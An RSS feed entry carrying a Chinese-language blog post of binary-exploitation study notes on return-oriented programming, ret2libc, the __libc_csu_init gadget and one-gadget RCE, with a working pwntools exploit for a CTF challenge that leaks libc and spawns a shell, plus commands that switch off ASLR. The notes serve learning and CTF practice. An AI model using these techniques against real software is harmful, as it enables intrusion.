<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>rop on Zet’s playground</title>
    <link>https://blog.zet.tw/tags/rop/</link>
    <description>Recent content in rop on Zet’s playground</description>
    <image>
      <url>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Tue, 31 May 2016 00:00:00 +0800</lastBuildDate><atom:link href="https://blog.zet.tw/tags/rop/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Return Oriented Programming</title>
      <link>https://blog.zet.tw/posts/2016-05-31-rop/</link>
      <pubDate>Tue, 31 May 2016 00:00:00 +0800</pubDate>
      
      <guid>https://blog.zet.tw/posts/2016-05-31-rop/</guid>
      <description>整理一下
找 getgads 工具  rp++ ROPgadget  Ret2libc 當程式有打開NX的時候造成 stack 上的 shellcode 無法執行，可以利用ret2libc或是利用ROP做mprotect開一個rwx的段，
參數傳遞  x86 利用stack x86_64 利用reg  Ret2libc 疊法 可以盡可能的把參數疊完整，比較不會發生一些鳥問題
一般x86的疊法是：
padding + function + ret address + argv1 + argv2 + argv3 .... 一般 function 可以直接跳 .plt ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&amp;quot;/bin/sh&amp;quot;)，ret address 可以直接填空沒關係
例如 :
&amp;#39;A&amp;#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr) x64: 利用一些 pop reg 的getgads把reg設定好
x32 參數直接疊在stack上，用 pop_ret 清掉用過的參數
read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x00007fffffffffff  DynELF 假如在不知道對方libc 的情況下可以使用pwntools中的一個工具DynELF，給他一個leak的點，可以幫你找出function的位置</description>
      <content:encoded><![CDATA[<p>整理一下</p>
<h2 id="找-getgads-工具">找 getgads 工具</h2>
<ul>
<li>rp++</li>
<li>ROPgadget</li>
</ul>
<h2 id="ret2libc">Ret2libc</h2>
<p>當程式有打開<code>NX</code>的時候造成 stack 上的 shellcode 無法執行，可以利用<code>ret2libc</code>或是利用ROP做<code>mprotect</code>開一個rwx的段，</p>
<h3 id="參數傳遞">參數傳遞</h3>
<ul>
<li>x86
利用stack</li>
<li>x86_64
利用reg</li>
</ul>
<h3 id="ret2libc-疊法">Ret2libc 疊法</h3>
<p>可以盡可能的把參數疊完整，比較不會發生一些鳥問題</p>
<p>一般x86的疊法是：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding +  function + ret address + argv1 + argv2 + argv3 ....
</code></pre></div><p>一般 function 可以直接跳 <code>.plt</code> ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&quot;/bin/sh&quot;)，ret address 可以直接填空沒關係</p>
<p>例如 :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#39;A&#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr)
</code></pre></div><p>x64:
利用一些 <code>pop reg</code> 的getgads把reg設定好</p>
<h3 id="x32">x32</h3>
<p>參數直接疊在stack上，用 pop_ret 清掉用過的參數</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">read @ plt
pop_pop_pop_ret
0
addr
length
system @ plt
</code></pre></div><h3 id="x86_64">x86_64</h3>
<ul>
<li>最大地址 <code>0x00007fffffffffff</code></li>
</ul>
<h3 id="dynelf">DynELF</h3>
<p>假如在不知道對方libc 的情況下可以使用pwntools中的一個工具<code>DynELF</code>，給他一個leak的點，可以幫你找出function的位置</p>
<p>這是313c CTF 中的 cfy 可以當作練習</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> time

printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601020</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
    r<span style="color:#f92672">.</span>sendline(p64(addr) )
    s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;hex: 0x&#39;</span>)[<span style="color:#ae81ff">5</span>:]<span style="color:#f92672">.</span>strip()
    s <span style="color:#f92672">=</span> p64( int(s,<span style="color:#ae81ff">16</span>) )
    <span style="color:#66d9ef">return</span> s

r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">4000</span>)

ptr_libc <span style="color:#f92672">=</span> u64(leak(printf_got))
d <span style="color:#f92672">=</span> DynELF(leak, ptr_libc)
system <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>)

print r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;quit&#39;</span>)
r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;7&#39;</span>)
r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(system) )

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="aslr">ASLR</h3>
<ul>
<li>aslr on</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=2
</code></pre></div><ul>
<li>aslr off</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=0
</code></pre></div><p>假如有ASLR，本的的話 32bit可以使用<code>ulimit -s unlimited</code>關閉，或是可以利用<code>puts</code>，leak <code>.got</code> 段上的資料 同一個 libc function 之間的偏移是固定的</p>
<p>一般常出現的函數 :</p>
<ul>
<li>__libc_start_main</li>
<li>puts</li>
<li>read</li>
<li>write</li>
<li>&hellip;..</li>
</ul>
<h2 id="x64-通用gadgets">x64 通用gadgets</h2>
<p>這些函數都可以利用</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">ROPgadget --binary ./binary --depth 100
</code></pre></div><p>不從版本 gadgets 會不太一樣，不過都可以通用，在於__libc_csu_init()</p>
<p>假如有些指令切一半的話也可以對reg做操作</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">&lt;__libc_csu_init&gt;:
5b                       pop    rbx
5d                       pop    rbp
41 5c                    pop    r12   -&gt;   pop rsp (5c)
41 5d                    pop    r13   -&gt;   pop rbp (5d)
41 5e                    pop    r14   -&gt;   pop rsi (5e)
41 5f                    pop    r15   -&gt;   pop rdi (5f)
c3                       ret
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">mov    rbx,QWORD PTR [rsp+0x8]
mov    rbp,QWORD PTR [rsp+0x10]
mov    r12,QWORD PTR [rsp+0x18]
mov    r13,QWORD PTR [rsp+0x20]
mov    r14,QWORD PTR [rsp+0x28]
mov    r15,QWORD PTR [rsp+0x30]
add    rsp,0x38
ret
</code></pre></div><p>利用這些gadgets可以把 r12-r15 控好，<code>call qword ptr [r12+rbx*8]</code>的時候可以將<code>rbp等於1，rbx等於0</code>才會繼續ret下去，這部分可以自己跟一次比較清楚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">4c 89 ea                 mov    rdx,r13
4c 89 f6                 mov    rsi,r14
44 89 ff                 mov    edi,r15d
41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
</code></pre></div><h2 id="one-gadgets-rce">One gadgets RCE</h2>
<p>在一些特定的libc中藏有可以直接執行execv(&quot;/bin/sh&quot;)，可以觀察一下libc中有用到execv的附近藏有&quot;/bin/sh&quot;的字串，有機會可以直接成功</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
